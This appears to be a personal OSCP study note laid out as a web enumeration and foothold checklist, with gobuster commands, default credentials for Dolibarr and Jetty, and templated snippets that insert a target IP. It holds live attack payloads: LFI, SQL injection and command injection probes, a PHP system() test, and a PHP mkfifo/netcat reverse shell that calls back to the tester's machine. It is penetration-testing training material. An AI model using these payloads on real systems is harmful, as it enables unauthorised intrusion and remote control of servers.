## 2. Service Enumeration

### 🌐 Web (80/443)
> [!note]- Web Checklist
> - [ ] Visit site
> - [ ] View source
> - [ ] Identify tech/CMS
> - [ ] Test parameters (?id=1, ?page=)
> - [ ] Analyze error page
> - [ ] curl -i domain
>
> #### Brute Force
> - [ ] Directory brute force (common)
> - [ ] Directory brute force (big)
> - [ ] Vhost brute force
> - [ ] Feroxbuster File directories sweep
>
> #### Vulnerability Testing
> - [ ] LFI (../../../../etc/passwd)
> - [ ] SQLi (test' or 1=1;-- -) [[SQL Injection]]
> - [ ] Command Injection (; whoami)
> - [ ] PHP code inclusion
> - [ ] File upload (if available)
>
> #### Hidden Content
> - [ ] Check JS files
> - [ ] Check comments
> - [ ] Check backups (.bak, .zip)

#### If Found : Login Pages
> [!tip]- Admin Page
> 
> > #### Admin Login
> - [ ] Discover software version
> - [ ] Research about software
> - [ ] Search and Try Default credentials
> - [ ] Research CVEs related to version
>
> #### Registration
> - [ ] Register an account
> - [ ] Login using registered account
>
> #### User Login
> - [ ] Default credentials
> - [ ] 
>
> #### Reset Password (Email)
> - [ ] If invalid email = does not match our records, SQLi (test' or 1=1;-- -)  [[SQL Injection|link]]
>
> #### Admin Dashboards
> - [ ] Search for framework CVEs
> - [ ] Search for dependencies CVEs
> - [ ] File Uploads for PHP arbitrary code execution [[Arbitrary File Upload Vulnerability|link]]

#### If Found: .git
> [!tip]- Git Dump
> - [ ] Run git-dumper
> - [ ] Search for creds
> - [ ] Check commit history

## 2. Footholds

[[2. Footholds]]
### 80 Web

Web Testing
- [ ] Visit web address
- [ ] Try default credentials
- [ ] Test for php execution
- [ ] Test for Server Side Request Forgery (SSRF)
- [ ] If .git, GIT Dump

Brute Forcing
- [ ] Directory brute force (Big.txt)
- [ ] Directory brute force (Common.txt)
- [ ] Feroxbuster sweep through file directories
- [ ] Curl -i newfound directory
- [ ] Vhost brute force

---

Visit the web Address
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";

const command = `http://${ip}/`;

dv.paragraph("```bash\n" + command + "\n```");
```
If find any domain names,

Add hosts to /etc/hosts 
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";

const command = `echo "${ip} [domain_name]" | sudo tee -a /etc/hosts`;

dv.paragraph("```bash\n" + command + "\n```");
```
---

Use GoBuster to enumerate vhosts and directories

Directories

```
gobuster dir --url http://[domain.com]/ --wordlist /usr/share/wordlists/dirb/big.txt
```

VHosts

```
sudo gobuster vhost -u http://[domain.com]/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
```

Add newfound vhost to /etc/hosts
```dataviewjs
const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";

const command = `echo "${ip} [domain_name]" | sudo tee -a /etc/hosts`;

dv.paragraph("```bash\n" + command + "\n```");
```
---

If admin login page is found,

Google for default credentials

| Service  | Version          | User  | Username | Password |
| -------- | ---------------- | ----- | -------- | -------- |
| Dolibarr | 17.0.0           | Admin | admin    | admin    |
| Jetty    | 9.4.39.v20210325 | Admin | admin    | admin    |
|          |                  |       |          |          |

---

Observe any suspicious error pages and conduct further research

Examples : 
1. Whitelabel Error Page > Sprint Boot Java Framework

---

Look for php code inclusion

Templates
Pages

Test for php execution
```
<?PHP echo system("whoami");?>
```

---

Testing for SQL Injection

```
test' or 1=1;-- - 
```


---

If it works, obtain a reverse shell

Start a nc listener

```
nc -lvnp 4444
```

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `<?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${KaliIP} 4444 >/tmp/f");?>`;

dv.paragraph("```bash\n" + command + "\n```");
```
Once shell is obtained, [[4 Shell Upgrade]]
